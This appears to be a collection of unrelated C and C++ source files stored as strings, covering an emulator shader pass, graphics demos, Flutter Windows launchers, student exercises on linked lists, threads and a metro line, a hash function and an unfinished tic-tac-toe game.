    "// SPDX-FileCopyrightText: Copyright 2021 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"common/settings.h\"\n#include \"shader_recompiler/environment.h\"\n#include \"shader_recompiler/frontend/ir/ir_emitter.h\"\n#include \"shader_recompiler/frontend/ir/modifiers.h\"\n#include \"shader_recompiler/frontend/ir/program.h\"\n#include \"shader_recompiler/frontend/ir/value.h\"\n#include \"shader_recompiler/ir_opt/passes.h\"\n#include \"shader_recompiler/shader_info.h\"\n\nnamespace Shader::Optimization {\nnamespace {\n[[nodiscard]] bool IsTextureTypeRescalable(TextureType type) {\n    switch (type) {\n    case TextureType::Color2D:\n    case TextureType::ColorArray2D:\n    case TextureType::Color2DRect:\n        return true;\n    case TextureType::Color1D:\n    case TextureType::ColorArray1D:\n    case TextureType::Color3D:\n    case TextureType::ColorCube:\n    case TextureType::ColorArrayCube:\n    case TextureType::Buffer:\n        break;\n    }\n    return false;\n}\n\nvoid VisitMark(IR::Block& block, IR::Inst& inst) {\n    switch (inst.GetOpcode()) {\n    case IR::Opcode::ShuffleIndex:\n    case IR::Opcode::ShuffleUp:\n    case IR::Opcode::ShuffleDown:\n    case IR::Opcode::ShuffleButterfly: {\n        const IR::Value shfl_arg{inst.Arg(0)};\n        if (shfl_arg.IsImmediate()) {\n            break;\n        }\n        const IR::Inst* const arg_inst{shfl_arg.InstRecursive()};\n        if (arg_inst->GetOpcode() != IR::Opcode::BitCastU32F32) {\n            break;\n        }\n        const IR::Value bitcast_arg{arg_inst->Arg(0)};\n        if (bitcast_arg.IsImmediate()) {\n            break;\n        }\n        IR::Inst* const bitcast_inst{bitcast_arg.InstRecursive()};\n        bool must_patch_outside = false;\n        if (bitcast_inst->GetOpcode() == IR::Opcode::GetAttribute) {\n            const IR::Attribute attr{bitcast_inst->Arg(0).Attribute()};\n            switch (attr) {\n            case IR::Attribute::PositionX:\n            case IR::Attribute::PositionY:\n                bitcast_inst->SetFlags<u32>(0xDEADBEEF);\n                must_patch_outside = true;\n                break;\n            default:\n                break;\n            }\n        }\n        if (must_patch_outside) {\n            const auto it{IR::Block::InstructionList::s_iterator_to(inst)};\n            IR::IREmitter ir{block, IR::Block::InstructionList::s_iterator_to(inst)};\n            const IR::F32 new_inst{&*block.PrependNewInst(it, inst)};\n            const IR::F32 up_factor{ir.FPRecip(ir.ResolutionDownFactor())};\n            const IR::Value converted{ir.FPMul(new_inst, up_factor)};\n            inst.ReplaceUsesWith(converted);\n        }\n        break;\n    }\n\n    default:\n        break;\n    }\n}\n\nvoid PatchFragCoord(IR::Block& block, IR::Inst& inst) {\n    IR::IREmitter ir{block, IR::Block::InstructionList::s_iterator_to(inst)};\n    const IR::F32 down_factor{ir.ResolutionDownFactor()};\n    const IR::F32 frag_coord{ir.GetAttribute(inst.Arg(0).Attribute())};\n    const IR::F32 downscaled_frag_coord{ir.FPMul(frag_coord, down_factor)};\n    inst.ReplaceUsesWith(downscaled_frag_coord);\n}\n\nvoid PatchPointSize(IR::Block& block, IR::Inst& inst) {\n    IR::IREmitter ir{block, IR::Block::InstructionList::s_iterator_to(inst)};\n    const IR::F32 point_value{inst.Arg(1)};\n    const IR::F32 up_factor{ir.FPRecip(ir.ResolutionDownFactor())};\n    const IR::F32 upscaled_point_value{ir.FPMul(point_value, up_factor)};\n    inst.SetArg(1, upscaled_point_value);\n}\n\n[[nodiscard]] IR::U32 Scale(IR::IREmitter& ir, const IR::U1& is_scaled, const IR::U32& value) {\n    IR::U32 scaled_value{value};\n    if (const u32 up_scale = Settings::values.resolution_info.up_scale; up_scale != 1) {\n        scaled_value = ir.IMul(scaled_value, ir.Imm32(up_scale));\n    }\n    if (const u32 down_shift = Settings::values.resolution_info.down_shift; down_shift != 0) {\n        scaled_value = ir.ShiftRightArithmetic(scaled_value, ir.Imm32(down_shift));\n    }\n    return IR::U32{ir.Select(is_scaled, scaled_value, value)};\n}\n\n[[nodiscard]] IR::U32 SubScale(IR::IREmitter& ir, const IR::U1& is_scaled, const IR::U32& value,\n                               const IR::Attribute attrib) {\n    const IR::F32 up_factor{ir.Imm32(Settings::values.resolution_info.up_factor)};\n    const IR::F32 base{ir.FPMul(ir.ConvertUToF(32, 32, value), up_factor)};\n    const IR::F32 frag_coord{ir.GetAttribute(attrib)};\n    const IR::F32 down_factor{ir.Imm32(Settings::values.resolution_info.down_factor)};\n    const IR::F32 floor{ir.FPMul(up_factor, ir.FPFloor(ir.FPMul(frag_coord, down_factor)))};\n    const IR::F16F32F64 deviation{ir.FPAdd(base, ir.FPAdd(frag_coord, ir.FPNeg(floor)))};\n    return IR::U32{ir.Select(is_scaled, ir.ConvertFToU(32, deviation), value)};\n}\n\n[[nodiscard]] IR::U32 DownScale(IR::IREmitter& ir, const IR::U1& is_scaled, const IR::U32& value) {\n    IR::U32 scaled_value{value};\n    if (const u32 down_shift = Settings::values.resolution_info.down_shift; down_shift != 0) {\n        scaled_value = ir.ShiftLeftLogical(scaled_value, ir.Imm32(down_shi",
    "#include <GL/glut.h>\n#include <iostream>\n\nint windowWidth = 800;\nint windowHeight = 600;\n\nint menuID;\nint submenuID;\n\n// Variables for Koch curve\nint kochLevel = 0;\n\n// Variables for Bezier curve\nint numControlPoints = 0;\nGLfloat controlPoints[10][2];\n\nvoid drawKochCurve(GLfloat x1, GLfloat y1, GLfloat x2, GLfloat y2, int level) {\n    if (level == 0) {\n        glBegin(GL_LINES);\n        glVertex2f(x1, y1);\n        glVertex2f(x2, y2);\n        glEnd();\n    } else {\n        GLfloat deltaX = x2 - x1;\n        GLfloat deltaY = y2 - y1;\n        GLfloat x3 = x1 + deltaX / 3;\n        GLfloat y3 = y1 + deltaY / 3;\n        GLfloat x4 = x1 + 2 * deltaX / 3;\n        GLfloat y4 = y1 + 2 * deltaY / 3;\n        GLfloat x5 = x3 + (x4 - x3) * 0.5 - (y4 - y3) * 0.866;\n        GLfloat y5 = y3 + (y4 - y3) * 0.5 + (x4 - x3) * 0.866;\n\n        drawKochCurve(x1, y1, x3, y3, level - 1);\n        drawKochCurve(x3, y3, x5, y5, level - 1);\n        drawKochCurve(x5, y5, x4, y4, level - 1);\n        drawKochCurve(x4, y4, x2, y2, level - 1);\n    }\n}\n\nvoid drawBezierCurve() {\n    glBegin(GL_LINE_STRIP);\n    for (int i = 0; i <= numControlPoints; ++i) {\n        glVertex2f(controlPoints[i][0], controlPoints[i][1]);\n    }\n    glEnd();\n}\n\nvoid display() {\n    glClear(GL_COLOR_BUFFER_BIT);\n\n    // Draw Koch curve\n    glColor3f(1.0f, 0.0f, 0.0f);\n    drawKochCurve(-0.8f, -0.5f, 0.8f, -0.5f, kochLevel);\n\n    // Draw Bezier curve\n    glColor3f(0.0f, 0.0f, 1.0f);\n    drawBezierCurve();\n\n    glFlush();\n}\n\nvoid processMenuEvents(int option) {\n    switch (option) {\n        case 1:\n            kochLevel++;\n            break;\n        case 2:\n            kochLevel--;\n            if (kochLevel < 0) {\n                kochLevel = 0;\n            }\n            break;\n        case 3:\n            std::cout << \"Enter the number of control points (2-10): \";\n            std::cin >> numControlPoints;\n            if (numControlPoints < 2) {\n                numControlPoints = 2;\n            } else if (numControlPoints > 10) {\n                numControlPoints = 10;\n            }\n            std::cout << \"Enter the control points (x y):\" << std::endl;\n            for (int i = 0; i < numControlPoints; ++i) {\n                std::cin >> controlPoints[i][0] >> controlPoints[i][1];\n            }\n            break;\n        case 4:\n            numControlPoints = 0;\n            break;\n        case 5:\n            exit(0);\n    }\n    glutPostRedisplay();\n}\n\nvoid createMenu() {\n    submenuID = glutCreateMenu(processMenuEvents);\n    glutAddMenuEntry(\"Increase Level\", 1);\n    glutAddMenuEntry(\"Decrease Level\", 2);\n\n    menuID = glutCreateMenu(processMenuEvents);\n    glutAddSubMenu(\"Koch Curve\", submenuID);\n    glutAddMenuEntry(\"Set Bezier Control Points\", 3);\n    glutAddMenuEntry(\"Clear Bezier Control Points\", 4);\n    glutAddMenuEntry(\"Exit\", 5);\n\n    glutAttachMenu(GLUT_RIGHT_BUTTON);\n}\n\nvoid reshape(int width, int height) {\n    glViewport(0, 0, width, height);\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    gluOrtho2D(-1.0, 1.0, -1.0, 1.0);\n    glMatrixMode(GL_MODELVIEW);\n}\n\nint main(int argc, char** argv) {\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n    glutInitWindowSize(windowWidth, windowHeight);\n    glutInitWindowPosition(100, 100);\n    glutCreateWindow(\"Koch & Bezier Curves\");\n\n    glClearColor(1.0f, 1.0f, 1.0f, 1.0f);\n\n    glutDisplayFunc(display);\n    glutReshapeFunc(reshape);\n\n    createMenu();\n\n    glutMainLoop();\n\n    return 0;\n}\n\n",
    "#include<stdio.h> \r\n#include<stdlib.h>\r\n#include<string.h>\r\ntypedef struct HNode\r\n{\r\n\tchar roomN[7];\r\n\tfloat Price;\r\n\tfloat PriceL;\r\n\tint Beds;\r\n\tchar State[5];\r\n\tstruct HNode *next;\r\n}Hotel,*HLink;\r\nvoid Build(HLink &H)//\u8f93\u5165\uff08\u5ba2\u623f\u540d\u79f0\u3001\u6807\u51c6\u4ef7\u683c\u3001\u5e8a\u4f4d\u6570\uff09\r\n{\r\n\tHLink p;\r\n\tHLink r;\r\n\tH = (HLink)malloc(sizeof(HNode));\r\n\tH->next = NULL;\r\n\tr = H;\r\n\tFILE *fp = fopen(\"ROOM.txt\",\"r\");\r\n\tprintf(\"\u8bfb\u53d6\u5ba2\u623f\u6570\u636e\u4e2d...\\n\");\r\n\twhile(!feof(fp))\r\n\t{\r\n\t\tp = (HLink)malloc(sizeof(HNode));\r\n\t\tfscanf(fp,\"%s%f%d\",p->roomN,&p->Price,&p->Beds);\r\n\t\tstrcpy(p->State,\"\u7a7a\u95f2\"); \r\n\t\tp->PriceL = p->Price*0.8;\r\n\t\tr->next = p;\r\n\t\tr = p;\r\n\t}\r\n\tr->next = NULL;\r\n\tfclose(fp);\r\n } \r\n void Exp(HLink H)//\u8f93\u51fa\u6240\u6709\u5ba2\u623f\u7684\u5ba2\u623f\u540d\u79f0\u3001\u6807\u51c6\u4ef7\u683c\u3001\u5165\u4f4f\u4ef7\u683c\u3001\u5e8a\u4f4d\u6570\u3001\u5165\u4f4f\u72b6\u6001\r\n {\r\n \tHLink p;\r\n \tp = H->next;\r\n \tprintf(\"\u5ba2\u623f\u4fe1\u606f\u5982\u4e0b\uff1a\\n\");\r\n \twhile(p)\r\n \t{\r\n \t\tprintf(\"%s%8.1f%8.1f%6d%8s\\n\",p->roomN,p->Price,p->PriceL,p->Beds,p->State);\r\n \t\tp=p->next;\r\n\t }\r\n  } \r\n  int Length(HLink H)\r\n  {\r\n  \tint length;\r\n  \tHLink p;\r\n  \tp = H->next;\r\n  \twhile(p->next)\r\n  \t{\r\n  \t\tp = p->next;\r\n  \t\tlength++;\r\n\t  }\r\n\t  return length;\r\n  }\r\n  void SortPriceL(HLink &H)//\u5347\u5e8f\u6392\u5e8f \r\n  {\r\n\tHLink p,r,s;\r\n\tint length,i,j;\r\n\tlength = Length(H);\r\n\tfor(i = 0; i<length; i++)\r\n\t{\r\n\t\tp = H->next;\r\n\t\ts = H;\r\n\t\tfor(j = 0; j<length-i && p != NULL; j++)\r\n\t\t{\r\n\t\t\tr = p->next;\r\n\t\t\tif(p->next == NULL) continue;\r\n\t\t\tif(p->PriceL > r->PriceL && (strcmp(p->roomN,r->roomN)))\r\n\t\t\t{\r\n\t\t\t\tp->next = r->next;\r\n\t\t\t\tr->next = p;\r\n\t\t\t\ts->next = r;\r\n\t\t\t\ts = r;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\ts = p;\r\n\t\t\t\tp = p->next;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n  }\r\n  int main()\r\n  {\r\n  \tHLink L;\r\n\tBuild(L);\r\n\tprintf(\"\u8bf7\u68c0\u67e5\u6570\u636e\\n\");\r\n\tExp(L);\r\n\tSortPriceL(L);\r\n\tExp(L);\r\n\treturn 0;\r\n   } \r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_ex\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"ProcessManager.h\"\n#include <iostream>\n\n// Constructor implementation\nProcess::Process(int id, int prio) : pid(id), state(ProcessState::NEW), cpuTime(0), priority(prio) {}\n\n// Getters implementation\nint Process::getPid() const { return pid; }\nProcessState Process::getState() const { return state; }\nint Process::getCpuTime() const { return cpuTime; }\nint Process::getPriority() const { return priority; }\n\n// Setters implementation\nvoid Process::setState(ProcessState newState) { state = newState; }\nvoid Process::setCpuTime(int time) { cpuTime = time; }\nvoid Process::setPriority(int prio) { priority = prio; }\n\n// Process methods implementation\nvoid Process::start() {\n    if (state == ProcessState::NEW || state == ProcessState::READY) {\n        state = ProcessState::RUNNING;\n        std::cout << \"Process \" << pid << \" started.\" << std::endl;\n    }\n}\n\nvoid Process::stop() {\n    if (state == ProcessState::RUNNING) {\n        state = ProcessState::WAITING;\n        std::cout << \"Process \" << pid << \" stopped.\" << std::endl;\n    }\n}\n\nvoid Process::terminate() {\n    state = ProcessState::TERMINATED;\n    std::cout << \"Process \" << pid << \" terminated.\" << std::endl;\n}\n\nvoid Process::update(int cpuCycle) {\n    if (state == ProcessState::RUNNING) {\n        cpuTime += cpuCycle;\n        std::cout << \"Process \" << pid << \" ran for \" << cpuCycle << \" cycles.\" << std::endl;\n    }\n}\n",
    "#include <iostream>\n#include <fstream> \n\nint main() {\n\n    // Image\n\n    int image_width = 256;\n    int image_height = 256;\n\n    // Open file for writing\n    std::ofstream outfile(\"image.ppm\");\n\n    // Render\n    outfile << \"P3\\n\" << image_width << ' ' << image_height << \"\\n255\\n\";\n\n    for (int j = 0; j < image_height; ++j) {\n        for (int i = 0; i < image_width; ++i) {\n            outfile << (i * 255 / (image_width - 1)) << ' ' \n                    << (j * 255 / (image_height - 1)) << \" 0\\n\";\n        }\n    }\n\n    // Close the file\n    outfile.close();\n\n    std::clog << \"\\rDone.                 \\n\";\n}\n\n// The pixels are written out in rows.\n\n// Every row of pixels is written out left to right.\n\n// These rows are written out from top to bottom.\n\n//By convention, each of the red/green/blue components are represented internally by real-valued variables that range \n//from 0.0 to 1.0. These must be scaled to integer values between 0 and 255 before we print them out.\n\n//Red goes from fully off (black) to fully on (bright red) from left to right, and green goes from fully off at the top (black) \n//to fully on at the bottom (bright green). Adding red and green light together make yellow so we should expect the bottom right \n//corner to be yellow.",
    "#include <iostream>\n#include <deque>\n#include <mutex>\n#include <thread>\n#include <condition_variable>\n\nusing namespace std;\n\ntemplate <typename T>\nclass ProducerConsumer {\n    deque<T> buffer;\n    size_t sizeMax;\n    mutex mtx;\n    condition_variable bufferReady;\npublic:\n    ProducerConsumer(size_t sizeMax) : sizeMax(sizeMax) {}\n\n    void produce(T value) {\n        unique_lock<mutex> lock(mtx);\n        bufferReady.wait(lock, [this](){ return this->buffer.size() < sizeMax; });\n\n        cout << \"Produced: \" << value << endl;\n        buffer.push_front(value);\n\n        bufferReady.notify_one();\n    }\n\n    void consume() {\n        unique_lock<mutex> lock(mtx);\n        bufferReady.wait(lock, [this](){ return !this->buffer.empty(); });\n\n        cout << \"Consumed: \" << buffer.back() << endl;\n        buffer.pop_back();\n\n        bufferReady.notify_one();\n    }\n};\n\nint main() {\n    ProducerConsumer<int> producerConsumer(5);\n    for (int i = 0; i < 10; ++i) {\n        thread consume(&ProducerConsumer<int>::consume, &producerConsumer);\n        thread produce(&ProducerConsumer<int>::produce, &producerConsumer, i);\n        consume.join();\n        produce.join();\n    }\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"linea.h\"\n#include \"estacion.h\"\n#include <iostream>\n#include <string>\nint indice = 0;\n\nestacion linea::agregarEstacionC(int e,int a){\n    string nombreEstacin;\n    int tiempoSigEstacion=0;\n    bool esTransferencia=false;\n\n    cout << \"Ingrese el nombre de la estacion \" << e + 1 << \": \";\n    cin >> nombreEstacin;\n    if(e==a){\n        tiempoSigEstacion = 0;\n    }else{\n        cout << \"Ingrese el tiempo hacia la siguiente estacion \" << e + 1 << \": \";\n        cin >> tiempoSigEstacion;\n    }\n    cout << \"Es esta una estacion de transferencia? (1 para si, 0 para no): \";\n    cin >> esTransferencia;\n\n    return estacion(e, nombreEstacin, tiempoSigEstacion, esTransferencia);\n}\n\nvoid linea::agregarEstacion(estacion* nuevaEstacion) {\n    // Primero, encontramos un espacio disponible en el arreglo de estaciones\n    int indice = 0;\n    while (indice < numestacions && estacions[indice] != nullptr) {\n        indice++;\n    }\n\n    numestacions++;\n\n    // Si encontramos un espacio disponible, agregamos la nueva estaci\u00f3n\n    if (indice < numestacions+1) {\n        estacions[indice] = nuevaEstacion;\n        cout << \"Estacion agregada correctamente a la linea.\" << endl;\n    } else {\n        cout << \"No hay espacio disponible para agregar mas estaciones a la linea.\" << endl;\n        delete nuevaEstacion; // Liberamos la memoria si no hay espacio disponible\n    }\n}\n\n\nvoid linea::editarNomLinea() {\n    string nuevoNombre;\n    cout << \"Ingrese el nuevo nombre para la linea: \";\n    cin >> nuevoNombre;\n    nomLinea = nuevoNombre;\n    cout << \"Nombre de linea actualizado correctamente.\" << endl;\n}\n\nint linea::cantidadEstacionsLinea()  {\n    int contadorEstaciones = 0;\n    for (int i = 0; i < numestacions; ++i) {\n        if (estacions[i] != nullptr) {\n            contadorEstaciones++;\n        }\n    }\n    return contadorEstaciones;\n}\n\n\nint linea::calcularTiempo(int indiceEstacion1, int indiceEstacion2) {\n    if (indiceEstacion1 < 0 || indiceEstacion1 >= numestacions || indiceEstacion2 < 0 || indiceEstacion2 >= numestacions) {\n        cout << \"Los \u00edndices de estaciones proporcionados son inv\u00e1lidos.\" << endl;\n        return -1; // Valor de retorno indicando error\n    }\n\n    int distanciaTotal = 0;\n    int indiceInicio = min(indiceEstacion1, indiceEstacion2);\n    int indiceFin = max(indiceEstacion1, indiceEstacion2);\n\n    for (int i = indiceInicio; i < indiceFin; ++i) {\n        if (estacions[i] != nullptr && estacions[i + 1] != nullptr) {\n            distanciaTotal += estacions[i]->getTiempoSigEstacion();\n        } else {\n            cout << \"Una o ambas estaciones seleccionadas no tienen tiempo hacia la siguiente estaci\u00f3n.\" << endl;\n            return -1; // Valor de retorno indicando error\n        }\n    }\n\n    return distanciaTotal;\n}\n\nint linea::mostrarEstacionesYSeleccionar(){\n    cout << \"Lista de estaciones en la linea \" << nomLinea << \":\" << endl;\n    for (int i = 0; i < numestacions; ++i) {\n        if (estacions[i] != nullptr) {\n            cout << i + 1 << \". \" << estacions[i]->getnomEstacion() << endl;\n        }\n    }\n    int seleccion;\n    do {\n        cout << \"Seleccione el numero de la estacion que desea: \";\n        cin >> seleccion;\n    } while (seleccion < 1 || seleccion > numestacions || estacions[seleccion - 1] == nullptr);\n\n    // Aqu\u00ed puedes hacer lo que necesites con la estaci\u00f3n seleccionada\n    cout << \"Ha seleccionado la estacion: \" << estacions[seleccion - 1]->getnomEstacion() << endl;\n    return seleccion-1;\n}\n\nvoid linea::eliminarEstacion(int seleccion){\n    if (seleccion >= 0 && seleccion < numestacions && estacions[seleccion] != nullptr) {\n        if (estacions[seleccion]->getEsTransferencia() == false) {\n            delete estacions[seleccion];\n            estacions[seleccion] = nullptr;\n            cout << \"Estacion eliminada correctamente de la linea.\" << endl;\n        } else {\n            cout << \"No se puede eliminar la estacion de transferencia.\" << endl;\n        }\n    } else {\n        cout << \"No se puede eliminar la estacion. \u00cdndice invalido o estacion inexistente.\" << endl;\n    }\n}\n\nvoid linea::editarNombreEstacion(int seleccion, string nuevoNombre) {\n    if (seleccion >= 0 && seleccion < numestacions && estacions[seleccion] != nullptr) {\n        estacions[seleccion]->setnomEstacion(nuevoNombre);\n        cout << \"Nombre de la estaci\u00f3n editado correctamente.\" << endl;\n    } else {\n        cout << \"No se puede editar el nombre de la estaci\u00f3n. \u00cdndice inv\u00e1lido o estaci\u00f3n inexistente.\" << endl;\n    }\n}\n\nvoid linea::listaEstacion(){\n    int i = 0;\n    cout << \"Lista de estaciones en la linea \" << nomLinea << \":\" << endl;\n    for (i ; i < numestacions; ++i) {\n       if (estacions[i] != nullptr) {\n           cout << i + 1 << \". \" << estacions[i]->getnomEstacion() << endl;\n       }\n    }\n    cout<<\"Con un total de \"<<i<<\" estaciones\"<<endl;\n}\n",
    "#include <assert.h>\n\n#include \"CodeArrayHashFuncs.h\"\n\nHashType CodeArrayMurmurHash(const void* hashingArr, const size_t length, const uint64_t seed)\n{\n    assert(hashingArr);\n    assert(length > 0);\n\n    const uint64_t c1 = 0x5bd1e995; \n    const uint64_t c2 = 24;\n\n    uint64_t hash = seed ^ (uint64_t)length;\n\n    const unsigned char* data = (const unsigned char*)hashingArr;\n    uint64_t word = 0;\n\n    size_t len = length;\n    while (len >= 4)\n    {\n        word  = data[0];\n        word |= data[1] <<  8;\n        word |= data[2] << 16;\n        word |= data[3] << 24;\n\n        word *= c1;\n        word ^= word >> c2;\n        word *= c1;\n\n        hash *= c1;\n        hash ^= word;\n\n        data += 4;\n        len -= 4;\n    }\n\n    assert(len < 4);\n\n    switch (len)\n    { \n        case 3:\n            hash ^= data[2] << 16;\n            // fall through\n        case 2:\n            hash ^= data[1] << 8;\n            // fall through\n        case 1:\n            hash ^= data[0];\n            hash *= c1;\n            break;\n        default:\n            break;\n    };\n\n    hash ^= hash >> 13;\n    hash *= c1;\n    hash ^= hash >> 15;\n\n    return hash;\n}\n",
    "// Tic Tac Toe Game\r\n\r\n// Author : The_mantux(C)\r\n// Date : 03-05-2024\r\n// github : https://github.com/The-mantux\r\n\r\n#include <iostream>\r\n#include <string>\r\n#include <windows.h>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\n\r\nusing namespace std;\r\n\r\n// Colors\r\n#define RESET       \"\\033[0m\"\r\n#define BLUE        \"\\033[1m\\033[34m\"  /*Player0*/\r\n#define RED         \"\\033[1m\\033[31m\"  /*Player1*/\r\n#define YELLOW      \"\\033[1m\\033[33m\"  /*beware error*/\r\n#define GREEN       \"\\033[1m\\033[32m\"  /*Winner*/\r\n\r\n// Prototypes\r\nint  menu();\r\nvoid printTutorialTable0();\r\nvoid printTutorialTable1();\r\nvoid gameTable(char table[3][3]);\r\nint  game(char table[3][3],int x);\r\nvoid tablePrint(char table[3][3]);\r\nint  player0(char table[3][3],int vet[],int &counter);\r\nint  checker(int cell[],int number);\r\nvoid selectCell(int &row,int &col,int number);\r\nvoid next();\r\n\r\nint main(){\r\n\r\n    int s,x,counter=0,row,col;\r\n\r\n    char table[3][3]={\r\n        {'1','2','3'},\r\n        {'4','5','6'},\r\n        {'7','8','9'}\r\n    };\r\n\r\n    int cell[3*3];\r\n\r\n    do{\r\n        system(\"cls\");\r\n        s=menu();\r\n\r\n        switch(s){\r\n\r\n            case 1:{\r\n                //Game\r\n\r\n                x=rand() % 2 + 1;\r\n                break;\r\n            }\r\n\r\n            case 2:{\r\n                //Tutorial\r\n\r\n                cout<<\"\\nPlayer 1 : \"<<BLUE<<\"X\"<<RESET<<endl;\r\n                cout<<\"Player 2 : \"<<RED<<\"O\"<<RESET<<endl;\r\n\r\n                cout<<\"\\n\";\r\n\r\n                cout<<\"At the beginning of the game you will be randomly chosen which player will start the game...\"<<endl;\r\n\r\n                next();\r\n                cin.get();\r\n\r\n                cout<<\"This is the game table: \\n\";\r\n                printTutorialTable0();\r\n                cout<<\"\\nSelect the cell number you want to select...\"<<endl;\r\n\r\n                next();\r\n\r\n                cout<<\"At the end of the game the result will be such a thing: \"<<endl;\r\n                printTutorialTable1();\r\n\r\n                next();\r\n\r\n                cout<<\"Keep track of your victories and defeats...\"<<endl;\r\n                cout<<\"Game\"<<endl;\r\n                cout<<\"Player 1 : \"<<BLUE<< 15<<\" Wins\"<<RESET<<endl;\r\n                cout<<\"Player 2 : \"<<RED<< 11<<\" Wins\"<<RESET<<endl;\r\n                cout<<\"Draws : \"<<2<<endl;\r\n\r\n                cout<<\"\\n\\nNow it's time to play\";\r\n\r\n                next();\r\n\r\n                break;\r\n            }\r\n\r\n            case 0:{\r\n                //Exit\r\n                cout<<BLUE<<\"Bye\"<<RESET<<endl;\r\n                break;\r\n            }\r\n\r\n            default:{\r\n                //Error\r\n                cout<<RED<<\"Error\"<<RESET<<endl;\r\n                break;\r\n            }\r\n        }\r\n\r\n    }while(s!=0);\r\n\r\n    return 0;\r\n}\r\n\r\nint game(char table[3][3],int x){\r\n    \r\n    if(x==1){\r\n        //Player 0\r\n        cout<<\"Player 1 starts the game\"<<endl;\r\n    }\r\n    else if(x==2){\r\n        cout<<\"Player 2 starts the game\"<<endl;\r\n    }\r\n\r\n}\r\n\r\nvoid tablePrint(char table[3][3]){\r\n\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[0][0]<<\"  |  \"<<table[0][1]<<\"  |  \"<<table[0][2]<<\"  \"<<endl;\r\n    cout<<\"_____|_____|_____\"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[1][0]<<\"  |  \"<<table[1][1]<<\"  |  \"<<table[1][2]<<\"  \"<<endl;\r\n    cout<<\"_____|_____|_____\"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[2][0]<<\"  |  \"<<table[2][1]<<\"  |  \"<<table[2][2]<<\"  \"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n}\r\n\r\nint player0(char table[3][3],int vet[],int &counter){\r\n    //Player 1\r\n\r\n    int cell,c=0,c1=0;\r\n\r\n    void tablePrint(char table[3][3]);\r\n\r\n    do{\r\n\r\n        cout<<\"Select the cell number you want to select...\"<<endl;\r\n        cin>>cell;\r\n\r\n        if(cell<1 || cell>9){\r\n            cout<<RED<<\"Insert an existing cell\"<<RESET<<endl;\r\n            c=-1;\r\n        }\r\n\r\n        c1=checker(vet,cell);\r\n        \r\n        if(c1==-1){\r\n            cout<<RED<<\"The cell is already occupied\\n\";\r\n        }\r\n\r\n\r\n    }while(c==-1 || c1==-1);\r\n\r\n    vet[counter]=cell;\r\n    counter++;\r\n\r\n    return cell;\r\n}\r\n\r\nvoid selectCell(int &row,int &col,int number){\r\n\r\n    if(number==1){\r\n        row=0;\r\n        col=0;\r\n    }\r\n    else if(number==2){\r\n        row=0;\r\n        col=1;\r\n    }\r\n    else if(number==3){\r\n        row=0;\r\n        col=2;\r\n    }\r\n    else if(number==4){\r\n        row=1;\r\n        col=0;\r\n    }\r\n    else if(number==5){\r\n        row=1;\r\n        col=1;\r\n    }\r\n    else if(number==6){\r\n        row=1;\r\n        col=2;\r\n    }\r\n    else if(number==7){\r\n        row=2;\r\n        col=0;\r\n    }\r\n    else if(number==8){\r\n        row=2;\r\n        col=1;\r\n    }\r\n    else if(number==9){\r\n        row=2;\r\n        col=2;\r\n    }\r\n}\r\n\r\nint checker(int cell[],int number){\r\n\r\n    bool check=false;\r\n\r\n    for(int i=0;i<sizeof(cell);i++){\r\n\r\n        if(cell[i]==number){\r\n            check=true;\r\n        }\r\n    }\r\n\r\n    if(check==true){\r\n        return -1;\r\n    }\r\n    else{\r\n        return 0;\r\n    